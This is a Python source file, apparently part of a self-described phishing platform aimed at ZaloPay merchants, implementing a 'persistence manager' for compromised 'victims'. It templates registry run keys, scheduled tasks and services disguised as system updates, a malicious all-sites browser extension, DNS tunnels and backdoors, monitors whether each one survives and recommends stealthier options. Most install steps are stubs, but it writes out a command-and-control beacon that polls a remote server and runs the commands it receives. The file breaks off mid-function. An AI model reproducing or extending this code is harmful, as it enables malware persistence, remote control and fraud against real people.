"""
Persistence Manager
Advanced persistence mechanisms for the ZaloPay Merchant Phishing Platform
"""

import os
import json
import time
import uuid
import base64
import hashlib
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union
import logging
from dataclasses import dataclass, asdict
from enum import Enum
import threading
import subprocess
import platform

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PersistenceType(Enum):
    """Persistence type enumeration"""
    REGISTRY = "registry"
    SCHEDULED_TASK = "scheduled_task"
    STARTUP_FOLDER = "startup_folder"
    SERVICE = "service"
    BROWSER_EXTENSION = "browser_extension"
    COOKIE_PERSISTENCE = "cookie_persistence"
    LOCAL_STORAGE = "local_storage"
    WEBSOCKET_CONNECTION = "websocket_connection"
    DNS_TUNNEL = "dns_tunnel"
    BACKDOOR = "backdoor"

class PersistenceStatus(Enum):
    """Persistence status enumeration"""
    ACTIVE = "active"
    INACTIVE = "inactive"
    COMPROMISED = "compromised"
    REMOVED = "removed"
    SUSPENDED = "suspended"

@dataclass
class PersistenceMechanism:
    """Persistence mechanism structure"""
    mechanism_id: str
    persistence_type: PersistenceType
    name: str
    description: str
    target_victim_id: str
    status: PersistenceStatus
    stealth_level: int
    detection_risk: int
    resource_usage: Dict[str, Any]
    installation_method: str
    removal_method: str
    survival_indicators: List[str]
    created_at: datetime
    last_checked: datetime
    metadata: Dict[str, Any]

@dataclass
class PersistenceCheck:
    """Persistence check result"""
    check_id: str
    mechanism_id: str
    check_type: str
    status: str
    details: Dict[str, Any]
    timestamp: datetime
    recommendations: List[str]

class PersistenceManager:
    """Advanced persistence management system"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.persistence_mechanisms = {}
        self.active_mechanisms = {}
        self.check_threads = {}
        self.survival_monitor = None
        
        # Initialize persistence templates
        self.persistence_templates = self._initialize_persistence_templates()
        
        # Start survival monitoring
        self.survival_monitor = threading.Thread(target=self._monitor_survival, daemon=True)
        self.survival_monitor.start()
    
    def _initialize_persistence_templates(self) -> Dict[str, PersistenceMechanism]:
        """Initialize persistence mechanism templates"""
        templates = {}
        
        # Registry persistence template
        templates["registry_persistence"] = PersistenceMechanism(
            mechanism_id="registry_template",
            persistence_type=PersistenceType.REGISTRY,
            name="Registry Run Key Persistence",
            description="Add malicious entry to Windows registry run keys",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=3,
            detection_risk=2,
            resource_usage={"cpu": "low", "memory": "low", "disk": "minimal"},
            installation_method="registry_modification",
            removal_method="registry_cleanup",
            survival_indicators=["registry_key_exists", "process_running", "network_activity"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "windows", "privileges": "user"}
        )
        
        # Scheduled task persistence template
        templates["scheduled_task"] = PersistenceMechanism(
            mechanism_id="scheduled_task_template",
            persistence_type=PersistenceType.SCHEDULED_TASK,
            name="Scheduled Task Persistence",
            description="Create scheduled task for persistent execution",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=4,
            detection_risk=3,
            resource_usage={"cpu": "low", "memory": "low", "disk": "minimal"},
            installation_method="task_creation",
            removal_method="task_deletion",
            survival_indicators=["task_exists", "task_enabled", "execution_logs"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "windows", "privileges": "user"}
        )
        
        # Startup folder persistence template
        templates["startup_folder"] = PersistenceMechanism(
            mechanism_id="startup_folder_template",
            persistence_type=PersistenceType.STARTUP_FOLDER,
            name="Startup Folder Persistence",
            description="Place executable in startup folder",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=2,
            detection_risk=1,
            resource_usage={"cpu": "low", "memory": "low", "disk": "minimal"},
            installation_method="file_copy",
            removal_method="file_deletion",
            survival_indicators=["file_exists", "startup_entry", "process_running"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "windows", "privileges": "user"}
        )
        
        # Service persistence template
        templates["service_persistence"] = PersistenceMechanism(
            mechanism_id="service_template",
            persistence_type=PersistenceType.SERVICE,
            name="Windows Service Persistence",
            description="Install malicious Windows service",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=5,
            detection_risk=4,
            resource_usage={"cpu": "low", "memory": "medium", "disk": "minimal"},
            installation_method="service_installation",
            removal_method="service_uninstallation",
            survival_indicators=["service_exists", "service_running", "service_logs"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "windows", "privileges": "admin"}
        )
        
        # Browser extension persistence template
        templates["browser_extension"] = PersistenceMechanism(
            mechanism_id="browser_extension_template",
            persistence_type=PersistenceType.BROWSER_EXTENSION,
            name="Browser Extension Persistence",
            description="Install malicious browser extension",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=4,
            detection_risk=2,
            resource_usage={"cpu": "low", "memory": "low", "disk": "minimal"},
            installation_method="extension_installation",
            removal_method="extension_removal",
            survival_indicators=["extension_installed", "extension_enabled", "extension_activity"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "cross_platform", "privileges": "user"}
        )
        
        # Cookie persistence template
        templates["cookie_persistence"] = PersistenceMechanism(
            mechanism_id="cookie_template",
            persistence_type=PersistenceType.COOKIE_PERSISTENCE,
            name="Cookie-based Persistence",
            description="Use persistent cookies for session maintenance",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=5,
            detection_risk=1,
            resource_usage={"cpu": "minimal", "memory": "minimal", "disk": "minimal"},
            installation_method="cookie_setting",
            removal_method="cookie_deletion",
            survival_indicators=["cookie_exists", "session_valid", "authentication_active"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "web", "privileges": "none"}
        )
        
        # Local storage persistence template
        templates["local_storage"] = PersistenceMechanism(
            mechanism_id="local_storage_template",
            persistence_type=PersistenceType.LOCAL_STORAGE,
            name="Local Storage Persistence",
            description="Use browser local storage for persistence",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=5,
            detection_risk=1,
            resource_usage={"cpu": "minimal", "memory": "minimal", "disk": "minimal"},
            installation_method="local_storage_setting",
            removal_method="local_storage_clearing",
            survival_indicators=["storage_exists", "data_valid", "access_active"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "web", "privileges": "none"}
        )
        
        # WebSocket connection persistence template
        templates["websocket_persistence"] = PersistenceMechanism(
            mechanism_id="websocket_template",
            persistence_type=PersistenceType.WEBSOCKET_CONNECTION,
            name="WebSocket Connection Persistence",
            description="Maintain persistent WebSocket connection",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=4,
            detection_risk=2,
            resource_usage={"cpu": "low", "memory": "low", "network": "low"},
            installation_method="websocket_connection",
            removal_method="websocket_disconnection",
            survival_indicators=["connection_active", "heartbeat_received", "data_transmitted"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "web", "privileges": "none"}
        )
        
        # DNS tunnel persistence template
        templates["dns_tunnel"] = PersistenceMechanism(
            mechanism_id="dns_tunnel_template",
            persistence_type=PersistenceType.DNS_TUNNEL,
            name="DNS Tunnel Persistence",
            description="Use DNS tunneling for persistent communication",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=5,
            detection_risk=3,
            resource_usage={"cpu": "low", "memory": "low", "network": "medium"},
            installation_method="dns_tunnel_setup",
            removal_method="dns_tunnel_cleanup",
            survival_indicators=["dns_queries", "tunnel_active", "data_transmitted"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "cross_platform", "privileges": "user"}
        )
        
        # Backdoor persistence template
        templates["backdoor"] = PersistenceMechanism(
            mechanism_id="backdoor_template",
            persistence_type=PersistenceType.BACKDOOR,
            name="Backdoor Persistence",
            description="Install backdoor for persistent access",
            target_victim_id="",
            status=PersistenceStatus.INACTIVE,
            stealth_level=2,
            detection_risk=5,
            resource_usage={"cpu": "medium", "memory": "medium", "disk": "low"},
            installation_method="backdoor_installation",
            removal_method="backdoor_removal",
            survival_indicators=["backdoor_active", "listening_port", "remote_access"],
            created_at=datetime.now(timezone.utc),
            last_checked=datetime.now(timezone.utc),
            metadata={"platform": "cross_platform", "privileges": "admin"}
        )
        
        return templates
    
    def install_persistence(self, victim_id: str, persistence_type: PersistenceType, 
                           custom_config: Dict[str, Any] = None) -> str:
        """Install persistence mechanism for victim"""
        try:
            mechanism_id = f"persist_{victim_id}_{persistence_type.value}_{int(time.time())}"
            
            # Get template
            template_key = f"{persistence_type.value}_template"
            if template_key not in self.persistence_templates:
                raise ValueError(f"Unknown persistence type: {persistence_type}")
            
            template = self.persistence_templates[template_key]
            
            # Create mechanism
            mechanism = PersistenceMechanism(
                mechanism_id=mechanism_id,
                persistence_type=persistence_type,
                name=f"{template.name} - {victim_id}",
                description=template.description,
                target_victim_id=victim_id,
                status=PersistenceStatus.INACTIVE,
                stealth_level=template.stealth_level,
                detection_risk=template.detection_risk,
                resource_usage=template.resource_usage.copy(),
                installation_method=template.installation_method,
                removal_method=template.removal_method,
                survival_indicators=template.survival_indicators.copy(),
                created_at=datetime.now(timezone.utc),
                last_checked=datetime.now(timezone.utc),
                metadata=template.metadata.copy()
            )
            
            # Apply custom configuration
            if custom_config:
                mechanism.metadata.update(custom_config)
            
            # Install persistence based on type
            installation_success = self._install_persistence_mechanism(mechanism)
            
            if installation_success:
                mechanism.status = PersistenceStatus.ACTIVE
                self.persistence_mechanisms[mechanism_id] = mechanism
                self.active_mechanisms[victim_id] = mechanism_id
                
                # Store in database
                self._store_persistence_mechanism(mechanism)
                
                # Start monitoring
                self._start_persistence_monitoring(mechanism_id)
                
                logger.info(f"Persistence mechanism installed: {mechanism_id} for victim: {victim_id}")
                return mechanism_id
            else:
                logger.error(f"Failed to install persistence mechanism: {mechanism_id}")
                return None
                
        except Exception as e:
            logger.error(f"Error installing persistence: {e}")
            raise
    
    def _install_persistence_mechanism(self, mechanism: PersistenceMechanism) -> bool:
        """Install specific persistence mechanism"""
        try:
            persistence_type = mechanism.persistence_type
            
            if persistence_type == PersistenceType.REGISTRY:
                return self._install_registry_persistence(mechanism)
            elif persistence_type == PersistenceType.SCHEDULED_TASK:
                return self._install_scheduled_task_persistence(mechanism)
            elif persistence_type == PersistenceType.STARTUP_FOLDER:
                return self._install_startup_folder_persistence(mechanism)
            elif persistence_type == PersistenceType.SERVICE:
                return self._install_service_persistence(mechanism)
            elif persistence_type == PersistenceType.BROWSER_EXTENSION:
                return self._install_browser_extension_persistence(mechanism)
            elif persistence_type == PersistenceType.COOKIE_PERSISTENCE:
                return self._install_cookie_persistence(mechanism)
            elif persistence_type == PersistenceType.LOCAL_STORAGE:
                return self._install_local_storage_persistence(mechanism)
            elif persistence_type == PersistenceType.WEBSOCKET_CONNECTION:
                return self._install_websocket_persistence(mechanism)
            elif persistence_type == PersistenceType.DNS_TUNNEL:
                return self._install_dns_tunnel_persistence(mechanism)
            elif persistence_type == PersistenceType.BACKDOOR:
                return self._install_backdoor_persistence(mechanism)
            else:
                logger.error(f"Unknown persistence type: {persistence_type}")
                return False
                
        except Exception as e:
            logger.error(f"Error installing persistence mechanism: {e}")
            return False
    
    def _install_registry_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install registry-based persistence"""
        try:
            if platform.system() != "Windows":
                logger.warning("Registry persistence only available on Windows")
                return False
            
            # Registry keys for persistence
            registry_keys = [
                r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            ]
            
            # Create payload
            payload_path = self._create_persistence_payload(mechanism)
            
            # Add to registry (simulated)
            for key in registry_keys:
                logger.info(f"Adding registry entry: {key}")
                # In real implementation, use winreg module or subprocess
            
            return True
            
        except Exception as e:
            logger.error(f"Error installing registry persistence: {e}")
            return False
    
    def _install_scheduled_task_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install scheduled task persistence"""
        try:
            if platform.system() != "Windows":
                logger.warning("Scheduled task persistence only available on Windows")
                return False
            
            # Create payload
            payload_path = self._create_persistence_payload(mechanism)
            
            # Create scheduled task (simulated)
            task_name = f"SystemUpdate_{mechanism.mechanism_id[:8]}"
            logger.info(f"Creating scheduled task: {task_name}")
            
            # In real implementation, use schtasks command or Task Scheduler API
            return True
            
        except Exception as e:
            logger.error(f"Error installing scheduled task persistence: {e}")
            return False
    
    def _install_startup_folder_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install startup folder persistence"""
        try:
            # Get startup folder path
            if platform.system() == "Windows":
                startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            elif platform.system() == "Darwin":  # macOS
                startup_folder = os.path.expanduser("~/Library/LaunchAgents")
            else:  # Linux
                startup_folder = os.path.expanduser("~/.config/autostart")
            
            # Create payload
            payload_path = self._create_persistence_payload(mechanism)
            
            # Copy to startup folder
            startup_payload = os.path.join(startup_folder, f"system_update_{mechanism.mechanism_id[:8]}.exe")
            logger.info(f"Installing startup persistence: {startup_payload}")
            
            # In real implementation, copy file
            return True
            
        except Exception as e:
            logger.error(f"Error installing startup folder persistence: {e}")
            return False
    
    def _install_service_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install Windows service persistence"""
        try:
            if platform.system() != "Windows":
                logger.warning("Service persistence only available on Windows")
                return False
            
            # Create service payload
            payload_path = self._create_persistence_payload(mechanism)
            
            # Install service (simulated)
            service_name = f"SystemService_{mechanism.mechanism_id[:8]}"
            logger.info(f"Installing Windows service: {service_name}")
            
            # In real implementation, use sc command or Service Control Manager API
            return True
            
        except Exception as e:
            logger.error(f"Error installing service persistence: {e}")
            return False
    
    def _install_browser_extension_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install browser extension persistence"""
        try:
            # Create extension manifest
            manifest = {
                "manifest_version": 2,
                "name": "System Update Helper",
                "version": "1.0.0",
                "description": "Helps with system updates",
                "permissions": ["activeTab", "storage", "webRequest"],
                "background": {
                    "scripts": ["background.js"],
                    "persistent": True
                },
                "content_scripts": [{
                    "matches": ["<all_urls>"],
                    "js": ["content.js"]
                }]
            }
            
            # Create extension files
            extension_id = f"ext_{mechanism.mechanism_id[:8]}"
            logger.info(f"Installing browser extension: {extension_id}")
            
            # In real implementation, create extension files and install
            return True
            
        except Exception as e:
            logger.error(f"Error installing browser extension persistence: {e}")
            return False
    
    def _install_cookie_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install cookie-based persistence"""
        try:
            # Create persistent cookie
            cookie_name = f"session_{mechanism.mechanism_id[:8]}"
            cookie_value = self._generate_persistence_token(mechanism)
            
            # Set cookie with long expiration
            expiration_date = datetime.now(timezone.utc) + timedelta(days=365)
            
            logger.info(f"Setting persistent cookie: {cookie_name}")
            
            # In real implementation, set cookie via browser automation
            return True
            
        except Exception as e:
            logger.error(f"Error installing cookie persistence: {e}")
            return False
    
    def _install_local_storage_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install local storage persistence"""
        try:
            # Create local storage data
            storage_key = f"persist_{mechanism.mechanism_id[:8]}"
            storage_value = self._generate_persistence_token(mechanism)
            
            logger.info(f"Setting local storage: {storage_key}")
            
            # In real implementation, set local storage via browser automation
            return True
            
        except Exception as e:
            logger.error(f"Error installing local storage persistence: {e}")
            return False
    
    def _install_websocket_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install WebSocket connection persistence"""
        try:
            # Create WebSocket connection
            ws_url = f"wss://persistence.{mechanism.mechanism_id[:8]}.com/ws"
            
            logger.info(f"Establishing WebSocket connection: {ws_url}")
            
            # In real implementation, establish WebSocket connection
            return True
            
        except Exception as e:
            logger.error(f"Error installing WebSocket persistence: {e}")
            return False
    
    def _install_dns_tunnel_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install DNS tunnel persistence"""
        try:
            # Create DNS tunnel
            tunnel_domain = f"{mechanism.mechanism_id[:8]}.tunnel.com"
            
            logger.info(f"Setting up DNS tunnel: {tunnel_domain}")
            
            # In real implementation, set up DNS tunneling
            return True
            
        except Exception as e:
            logger.error(f"Error installing DNS tunnel persistence: {e}")
            return False
    
    def _install_backdoor_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Install backdoor persistence"""
        try:
            # Create backdoor payload
            payload_path = self._create_persistence_payload(mechanism)
            
            # Set up listening port
            port = 8080 + hash(mechanism.mechanism_id) % 1000
            
            logger.info(f"Installing backdoor on port: {port}")
            
            # In real implementation, install backdoor
            return True
            
        except Exception as e:
            logger.error(f"Error installing backdoor persistence: {e}")
            return False
    
    def _create_persistence_payload(self, mechanism: PersistenceMechanism) -> str:
        """Create persistence payload"""
        try:
            # Generate payload content
            payload_content = f"""
# Persistence Payload for {mechanism.mechanism_id}
import time
import requests
import json

def main():
    while True:
        try:
            # Check in with command server
            response = requests.get("https://command.{mechanism.mechanism_id[:8]}.com/checkin")
            if response.status_code == 200:
                commands = response.json()
                for command in commands:
                    execute_command(command)
        except Exception as e:
            pass
        time.sleep(300)  # Check every 5 minutes

def execute_command(command):
    # Execute command (simplified)
    pass

if __name__ == "__main__":
    main()
"""
            
            # Save payload
            payload_path = f"/tmp/payload_{mechanism.mechanism_id[:8]}.py"
            with open(payload_path, 'w') as f:
                f.write(payload_content)
            
            return payload_path
            
        except Exception as e:
            logger.error(f"Error creating persistence payload: {e}")
            return None
    
    def _generate_persistence_token(self, mechanism: PersistenceMechanism) -> str:
        """Generate persistence token"""
        try:
            # Create token from mechanism data
            token_data = f"{mechanism.mechanism_id}:{mechanism.target_victim_id}:{int(time.time())}"
            token = base64.b64encode(token_data.encode()).decode()
            return token
            
        except Exception as e:
            logger.error(f"Error generating persistence token: {e}")
            return ""
    
    def check_persistence_survival(self, mechanism_id: str) -> PersistenceCheck:
        """Check if persistence mechanism is still active"""
        try:
            if mechanism_id not in self.persistence_mechanisms:
                raise ValueError(f"Unknown mechanism: {mechanism_id}")
            
            mechanism = self.persistence_mechanisms[mechanism_id]
            check_id = f"check_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            # Perform survival checks based on mechanism type
            survival_status = self._perform_survival_checks(mechanism)
            
            # Create check result
            check_result = PersistenceCheck(
                check_id=check_id,
                mechanism_id=mechanism_id,
                check_type="survival_check",
                status="active" if survival_status["active"] else "inactive",
                details=survival_status,
                timestamp=datetime.now(timezone.utc),
                recommendations=self._generate_survival_recommendations(mechanism, survival_status)
            )
            
            # Update mechanism status
            if survival_status["active"]:
                mechanism.status = PersistenceStatus.ACTIVE
            else:
                mechanism.status = PersistenceStatus.COMPROMISED
            
            mechanism.last_checked = datetime.now(timezone.utc)
            
            # Store check result
            self._store_persistence_check(check_result)
            
            return check_result
            
        except Exception as e:
            logger.error(f"Error checking persistence survival: {e}")
            return None
    
    def _perform_survival_checks(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Perform survival checks for persistence mechanism"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": [],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "low"
            }
            
            persistence_type = mechanism.persistence_type
            
            if persistence_type == PersistenceType.REGISTRY:
                survival_status = self._check_registry_survival(mechanism)
            elif persistence_type == PersistenceType.SCHEDULED_TASK:
                survival_status = self._check_scheduled_task_survival(mechanism)
            elif persistence_type == PersistenceType.STARTUP_FOLDER:
                survival_status = self._check_startup_folder_survival(mechanism)
            elif persistence_type == PersistenceType.SERVICE:
                survival_status = self._check_service_survival(mechanism)
            elif persistence_type == PersistenceType.BROWSER_EXTENSION:
                survival_status = self._check_browser_extension_survival(mechanism)
            elif persistence_type == PersistenceType.COOKIE_PERSISTENCE:
                survival_status = self._check_cookie_survival(mechanism)
            elif persistence_type == PersistenceType.LOCAL_STORAGE:
                survival_status = self._check_local_storage_survival(mechanism)
            elif persistence_type == PersistenceType.WEBSOCKET_CONNECTION:
                survival_status = self._check_websocket_survival(mechanism)
            elif persistence_type == PersistenceType.DNS_TUNNEL:
                survival_status = self._check_dns_tunnel_survival(mechanism)
            elif persistence_type == PersistenceType.BACKDOOR:
                survival_status = self._check_backdoor_survival(mechanism)
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error performing survival checks: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_registry_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check registry persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["registry_key_check", "process_check"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "medium"
            }
            
            # Check if registry key exists (simulated)
            registry_exists = True  # In real implementation, check actual registry
            if registry_exists:
                survival_status["indicators_found"].append("registry_key_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("registry_key_exists")
            
            # Check if process is running (simulated)
            process_running = True  # In real implementation, check actual processes
            if process_running:
                survival_status["indicators_found"].append("process_running")
            else:
                survival_status["indicators_missing"].append("process_running")
                survival_status["active"] = False
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking registry survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_scheduled_task_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check scheduled task persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["task_existence", "task_status"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "medium"
            }
            
            # Check if task exists (simulated)
            task_exists = True  # In real implementation, check actual tasks
            if task_exists:
                survival_status["indicators_found"].append("task_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("task_exists")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking scheduled task survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_startup_folder_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check startup folder persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["file_existence", "startup_entry"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "low"
            }
            
            # Check if file exists (simulated)
            file_exists = True  # In real implementation, check actual files
            if file_exists:
                survival_status["indicators_found"].append("file_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("file_exists")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking startup folder survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_service_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check service persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["service_existence", "service_status"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "high"
            }
            
            # Check if service exists (simulated)
            service_exists = True  # In real implementation, check actual services
            if service_exists:
                survival_status["indicators_found"].append("service_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("service_exists")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking service survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_browser_extension_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check browser extension persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["extension_installed", "extension_enabled"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "medium"
            }
            
            # Check if extension is installed (simulated)
            extension_installed = True  # In real implementation, check actual extensions
            if extension_installed:
                survival_status["indicators_found"].append("extension_installed")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("extension_installed")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking browser extension survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_cookie_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check cookie persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["cookie_existence", "cookie_validity"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "low"
            }
            
            # Check if cookie exists (simulated)
            cookie_exists = True  # In real implementation, check actual cookies
            if cookie_exists:
                survival_status["indicators_found"].append("cookie_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("cookie_exists")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking cookie survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_local_storage_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check local storage persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["storage_existence", "data_validity"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "low"
            }
            
            # Check if storage exists (simulated)
            storage_exists = True  # In real implementation, check actual storage
            if storage_exists:
                survival_status["indicators_found"].append("storage_exists")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("storage_exists")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking local storage survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_websocket_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check WebSocket persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["connection_status", "heartbeat_check"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "medium"
            }
            
            # Check if WebSocket is connected (simulated)
            connection_active = True  # In real implementation, check actual connection
            if connection_active:
                survival_status["indicators_found"].append("connection_active")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("connection_active")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking WebSocket survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_dns_tunnel_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check DNS tunnel persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["tunnel_status", "dns_queries"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "high"
            }
            
            # Check if tunnel is active (simulated)
            tunnel_active = True  # In real implementation, check actual tunnel
            if tunnel_active:
                survival_status["indicators_found"].append("tunnel_active")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("tunnel_active")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking DNS tunnel survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _check_backdoor_survival(self, mechanism: PersistenceMechanism) -> Dict[str, Any]:
        """Check backdoor persistence survival"""
        try:
            survival_status = {
                "active": False,
                "checks_performed": ["backdoor_status", "listening_port"],
                "indicators_found": [],
                "indicators_missing": [],
                "risk_level": "critical"
            }
            
            # Check if backdoor is active (simulated)
            backdoor_active = True  # In real implementation, check actual backdoor
            if backdoor_active:
                survival_status["indicators_found"].append("backdoor_active")
                survival_status["active"] = True
            else:
                survival_status["indicators_missing"].append("backdoor_active")
            
            return survival_status
            
        except Exception as e:
            logger.error(f"Error checking backdoor survival: {e}")
            return {"active": False, "error": str(e)}
    
    def _generate_survival_recommendations(self, mechanism: PersistenceMechanism, 
                                        survival_status: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on survival status"""
        try:
            recommendations = []
            
            if not survival_status["active"]:
                recommendations.append("Persistence mechanism is inactive - consider reinstalling")
                
                if "indicators_missing" in survival_status:
                    for indicator in survival_status["indicators_missing"]:
                        if indicator == "registry_key_exists":
                            recommendations.append("Registry key missing - reinstall registry persistence")
                        elif indicator == "process_running":
                            recommendations.append("Process not running - restart persistence process")
                        elif indicator == "task_exists":
                            recommendations.append("Scheduled task missing - recreate task")
                        elif indicator == "file_exists":
                            recommendations.append("Startup file missing - reinstall startup persistence")
                        elif indicator == "service_exists":
                            recommendations.append("Service missing - reinstall service")
                        elif indicator == "extension_installed":
                            recommendations.append("Browser extension missing - reinstall extension")
                        elif indicator == "cookie_exists":
                            recommendations.append("Cookie missing - reset cookie persistence")
                        elif indicator == "storage_exists":
                            recommendations.append("Local storage missing - reset storage persistence")
                        elif indicator == "connection_active":
                            recommendations.append("WebSocket connection lost - reestablish connection")
                        elif indicator == "tunnel_active":
                            recommendations.append("DNS tunnel inactive - restart tunnel")
                        elif indicator == "backdoor_active":
                            recommendations.append("Backdoor inactive - restart backdoor")
            
            risk_level = survival_status.get("risk_level", "low")
            if risk_level == "high":
                recommendations.append("High detection risk - consider switching to stealthier persistence")
            elif risk_level == "critical":
                recommendations.append("Critical detection risk - immediate action required")
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating survival recommendations: {e}")
            return ["Error generating recommendations"]
    
    def remove_persistence(self, mechanism_id: str) -> bool:
        """Remove persistence mechanism"""
        try:
            if mechanism_id not in self.persistence_mechanisms:
                raise ValueError(f"Unknown mechanism: {mechanism_id}")
            
            mechanism = self.persistence_mechanisms[mechanism_id]
            
            # Remove persistence based on type
            removal_success = self._remove_persistence_mechanism(mechanism)
            
            if removal_success:
                mechanism.status = PersistenceStatus.REMOVED
                
                # Remove from active mechanisms
                if mechanism.target_victim_id in self.active_mechanisms:
                    del self.active_mechanisms[mechanism.target_victim_id]
                
                # Stop monitoring
                if mechanism_id in self.check_threads:
                    del self.check_threads[mechanism_id]
                
                # Update database
                self._update_persistence_mechanism(mechanism)
                
                logger.info(f"Persistence mechanism removed: {mechanism_id}")
                return True
            else:
                logger.error(f"Failed to remove persistence mechanism: {mechanism_id}")
                return False
                
        except Exception as e:
            logger.error(f"Error removing persistence: {e}")
            return False
    
    def _remove_persistence_mechanism(self, mechanism: PersistenceMechanism) -> bool:
        """Remove specific persistence mechanism"""
        try:
